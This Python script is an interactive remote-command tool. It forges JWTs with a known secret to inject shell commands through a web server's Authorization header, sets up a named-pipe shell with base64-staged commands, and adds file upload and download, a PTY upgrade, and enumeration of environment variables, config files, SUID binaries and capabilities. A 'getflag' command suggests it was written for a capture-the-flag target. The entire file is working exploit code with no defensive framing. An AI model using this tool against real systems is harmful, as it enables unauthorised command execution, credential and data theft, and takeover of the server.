#!/usr/bin/env python3
from os import urandom
import os
import jwt
import sys
import time
import base64
import requests
import hashlib
import threading
import gzip
import re
import signal
import subprocess
import urllib.parse
from os.path import dirname
from urllib3.exceptions import InsecureRequestWarning

bold = "\033[1m"
green = "\033[32m"
white = "\033[37m"
purple = "\033[95m"
red = "\033[91m"
blue = "\033[34m"
orange = "\033[33m"
end = "\033[0m"

class forward_shell:
	
	jwt_algo = "HS256"
	
	Output = False

	
	def __init__(self, ip, port, key,interval=3):
		self.ip = ip
		self.port = port
		self.url = "http://" + self.ip + ":" + str(self.port) + "/"
		self.jwt_key = key

		
		self.session = hashlib.md5(urandom(10)).hexdigest()[0:5]
		self.forged_jwt = ""
		self.ip_file = f"/dev/shm/ip_{self.session}"
		self.op_file = f"/dev/shm/op_{self.session}"
		self.interval = interval
		self.chunk_size = 500

	
	def test_connection(self):
		print(f"{bold}{blue}[*] {white}Trying to Access {self.url}")
		try:
			
			r = requests.get(self.url, timeout=20)
			print(f"{bold}{green}[+] {white}Connection Established with {self.url}")

		
		except (requests.ConnectionError, requests.Timeout) as exception:
			print(f"{bold}{red}[-] Sorry, But I couldn't reach that...")
	
	
	def forge_jwt(self,jwt_algo="HS256",cmd='whoami'):
		space_escaped_cmd = cmd.replace(" ","${IFS}",-1)
		self.forged_jwt = jwt.encode({"cmd": space_escaped_cmd}, self.jwt_key, algorithm=jwt_algo)
		

			
	
	def create_mkfifo_pipe(self):
		self.Output = False
		mkfifo_pipe = f"mkfifo {self.ip_file}; tail -f {self.ip_file} | /bin/sh 2>&1 > {self.op_file}"
		b64_mkfifo_pipe = base64.b64encode(mkfifo_pipe.encode('utf-8')).decode('utf-8')
		final_b64_mkfifo_cmd = f"echo -n {b64_mkfifo_pipe}|base64 -d|sh"
		print(f"{bold}{green}[+] {white}Spawning new session {self.session}")
		self.forge_jwt(cmd=final_b64_mkfifo_cmd)

		print(f"{bold}{blue}[*] {white}Switching to Interactive Mode\n")

		# Creating mkfifo pipes hangs the web request forever
		# Therefore, Making it as a thread so, that the program does not hang 
		thread = threading.Thread(target=self.send_command, args=())
		thread.daemon = True
		thread.start()
	
	# Create the command to base64 encoding and prepare it to be sent to the mkfifo pipe
	def send_cmd(self,cmd="whoami"):
		# Sending a command into the mkfifo pipe
		# This sending process would not return any command output
		self.Output = False
		# Base64 encoding the command
		b64cmd = base64.b64encode('{}\n'.format(cmd.rstrip()).encode('utf-8')).decode('utf-8')
		# Sending the command in the format of echo base64cmd|base64 -d|sh
		stage_cmd =  f"echo -n {b64cmd}|base64 -d >{self.ip_file}"
		self.forge_jwt(cmd=stage_cmd)
		self.send_command()

	def signal_handler(self, signal, frame):
		print(bold+blue+"Ok Quiting Shell...\n")
		sys.exit(1)



	# Read the output from the mkfifo pipe
	def read_cmd(self):
		# Read the output session file in /dev/shm/
		self.Output = True
		get_output_cmd = f"/bin/cat {self.op_file}"
		self.forge_jwt(cmd=get_output_cmd)
		raw_result = self.send_command()
		signal.signal(signal.SIGINT, self.signal_handler)
		if raw_result:
			result = self.display(raw_result)
			if result == '':
				pass
			else:	
				time.sleep(0.01)

	# Clear the output file, Or else we would get all command outputs
	def clear_output_buffer(self):
		# Clear the command outputs
		# Does not return any command output
		self.Output = False
		clear_cmd = f'echo   > {self.op_file}'
		self.forge_jwt(cmd=clear_cmd)
		self.send_command()

	def cls(self):
		cmd = f'echo "" > {self.op_file}'
		self.send_cmd(cmd=cmd)

	def split_chunks(self, seq, n=8000):
		while seq:
			yield seq[:n]
			seq = seq[n:]		

	def read_chunks(self, input_file, CHUNK_SIZE):
		while True:
			data = input_file.read(CHUNK_SIZE)
			if not data:
				break
			yield data	


	def upload_file(self,input_file,output_file):
		self.input_file = input_file
		self.output_file = output_file
		try:
			with open(f"{self.input_file}", "rb") as file:
				raw_data = file.read()
		except:
			print(bold+red+"No Such File :D")
			sys.exit(0)	
		comp_data = gzip.compress(raw_data, compresslevel=9)
		enc_data = base64.b64encode(comp_data).decode('utf-8')
		chunk_array = list(self.split_chunks(enc_data, n=self.chunk_size))
		print(bold+blue+f'Remember After This Uploads Run Gzip To Unpack It :D')
		for index, chunk in enumerate(chunk_array):
			upload = f'echo -n {chunk} >> {self.output_file}.b64.gz'
			self.send_cmd(cmd=upload)			
#			expand_file = f'cat {output_file}.b64.gz'
#			self.send_cmd(cmd=expand_file)
#			base64togzip = f'| base64 -d >> {self.output_file}.gz'
#			unzip = f'; gzip -d -f {self.output_file}.gz ; rm -f {self.output_file}.b64.gz'

	def rungzip(self):
		if self.input_file == None and self.output_file == None:
			print(bold+blue+f'Please Run The Upload Function Before Running gzip')
		else:
			print(bold+blue+f'Unpacking File :D')
			self.gzipthatfile(self.input_file, self.output_file)			

	
	def gzipthatfile(self, input_file, output_file):
		cmd = f'cat {output_file}.b64.gz | base64 -d > {output_file}.gz'
		self.send_cmd(cmd=cmd)
		gzipcmd = f'gzip -d -f {output_file}.gz'
		self.send_cmd(cmd=gzipcmd)
		rmgzip = f'rm -f {output_file}.b64.gz'
		self.send_cmd(cmd=rmgzip)
		print(bold+blue+f"File Has Been Uploaded")		



	#Btw The Upgrade Function is in beta right now i ran it last night and it broke the web server
	def upgrade(self):
			UpgradeShell = """python3 -c 'import pty; pty.spawn("/bin/bash")'"""		
			self.send_cmd(cmd=UpgradeShell)
			self.read_cmd()
			time.sleep(2)
			rows, cols = subprocess.check_output(['stty', 'size']).decode().split()
			upgrade_pty = f"""export SHELL=bash; export TERM=xterm-256color;stty rows 38 cols 181; alias ll=\'ls -ali --color=auto\'"""
			self.send_cmd(cmd=upgrade_pty)
			self.read_cmd()
			time.sleep(2)
			cmd = 'bash -i'
			self.send_cmd(cmd=cmd)
			self.read_cmd()
			time.sleep(2)
#			inter = 'bash'
#			self.send_cmd(cmd=inter)
#			self.read_cmd()

	
	def bash(self):
		term = 'joe@'		

	
	def display(self, output):
		result = output.strip('\n')
		print(bold+white+result)

	
	def send_command(self):
		headers = {"Authorization": f"Bearer {self.forged_jwt}"}
		proxies = {"http": "http://127.0.0.1:8080"}
		r = requests.get(self.url,headers=headers, proxies=proxies)
		# Checking if the command returns any output
		if self.Output:
			output = r.text.rstrip()
			result = self.display(output)
			print(f"{end}{bold}",end="")
			self.cls()
			
			

	def linenum(self):
		cmd = 'df -h && lsblk'
		print(bold+blue+"Enumerating System Stats")	
		fs.send_cmd(cmd=cmd)
		fs.read_cmd()
		cmd = 'which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl'		 	
		print(bold+blue+"Enumerating Useful Software")
		fs.send_cmd(cmd=cmd)
		fs.read_cmd()
		cmd = 'printenv'
		print(bold+blue+"Getting Environment Info")
		fs.send_cmd(cmd=cmd)
		fs.read_cmd()
		cmd = 'ps -aux'
		print(bold+blue+"Enumerating System Processes")
		fs.send_cmd(cmd=cmd)
		fs.read_cmd()
		cmd = 'lscpu'
		print(bold+blue+"Getting Cpu Info")
		fs.send_cmd(cmd=cmd)
		fs.read_cmd()
		cmd = 'cat /etc/hostname /etc/hosts /etc/resolv.conf && ip a && ip n'
		print(bold+blue+"Gathering Network Info")
		fs.send_cmd(cmd=cmd)
		fs.read_cmd()
		cmd = 'find / -name *.conf'
		print(bold+blue+"Enumerating Config Files")
		fs.send_cmd(cmd=cmd)
		fs.read_cmd()
		cmd = 'cat /etc/ldap/ldap.conf'
		print(bold+blue+"Enumerating Ldap")
		fs.send_cmd(cmd=cmd)
		fs.read_cmd()
		cmd = 'ls -la /home/user/'  #CHANGE ME
		print(bold+blue+"Enumerating Files In Users Home Directory")
		fs.send_cmd(cmd=cmd)
		fs.read_cmd()
		cmd = 'getcap / -r'
		print(bold+blue+"Enumerating Capabillitys")
		fs.send_cmd(cmd=cmd)
		fs.read_cmd()

	def download(self, input_file):
		cmd = f'cat {input_file} | base64 -w0'
		self.send_cmd(cmd=cmd)
		self.read_cmd()

		 		

	
	def display_results(self, raw_output):
		result = raw_output.strip('\n')
		return result





	def help(self):
		print(bold+purple+"Custom Commands:\n")

		print(bold+red+"sysinfo\n")
		print(bold+red+"getsuid\n")
		print(bold+red+"getflag\n")
		print(bold+red+"LinEnum\n")
		print(bold+red+"upload\n")
		print(bold+red+"download\n")
		print(bold+red+"cls\n")
		print(bold+red+"gzip\n")			


if __name__ == '__main__':

	key = "JWT_SECRET"   #CHANGE ME ;D

	# Taking the IP and Port as Input
	#IP = input(f"{bold}{green} RHOST : {end}")
	#PORT = int(input(f"{bold}{green} RPORT : {end}"))
	
	IP = "IP"   #CHANGE ME
	PORT = PORT #CHANGE ME

	# Creating a new object with the IP and PORT as entered by user
	fs = forward_shell(IP,PORT,key=key)

	# Test's whether the webserver is available or not
	fs.test_connection()

	# Create a mkfifo command line bridgefile
	fs.create_mkfifo_pipe()

	term = f"{bold}{green}PWN3D!> {red}"
	while True:
		global cmd
		cmd = input(term)
		if cmd == "help":
			fs.help()

		elif cmd == "sysinfo":
			cmd = 'uname -a'
			fs.send_cmd(cmd=cmd)
			fs.read_cmd()
		elif cmd == "getflag":
			cmd = 'cat /home/user/Desktop/flag.txt'
			fs.send_cmd(cmd=cmd)
			fs.read_cmd()
		elif cmd == "getsuid":
			cmd = 'find / -perm -4000'
			fs.send_cmd(cmd=cmd)
			fs.read_cmd()
		elif cmd == "linenum" or cmd == "LinEnum":
			fs.linenum()

		elif cmd.startswith("upload") or cmd.startswith("Upload"):
			split = cmd.split(" ")
			if len(split) < 2:
				print(bold+red+"upload src dst")
			else:
				input_file = split[1]
				output_file = split[2]
				print(bold+blue+f"Uploading {input_file} To {output_file}")	
				fs.upload_file(input_file, output_file)
		elif cmd.startswith('download') or cmd.startswith('Download'):
			split = cmd.split(" ")
			if len(split) < 2:
				print(bold+blue+"download input_file")
			else:
				input_file = split[1]
				
					
				print(bold+purple+f"Base64 Encoding File Now Copy It And Base64 decode It :D")
				fs.download(input_file)
				
									

		elif cmd == 'upgrade' or cmd == 'Upgrade':
			term = f""
			fs.upgrade()
					

		elif cmd == "cls" or cmd == "Cls":
			fs.cls()

		elif cmd == "gzip" or cmd == "Gzip":
			fs.rungzip()	


		else:	
			fs.send_cmd(cmd=cmd)
			fs.read_cmd()
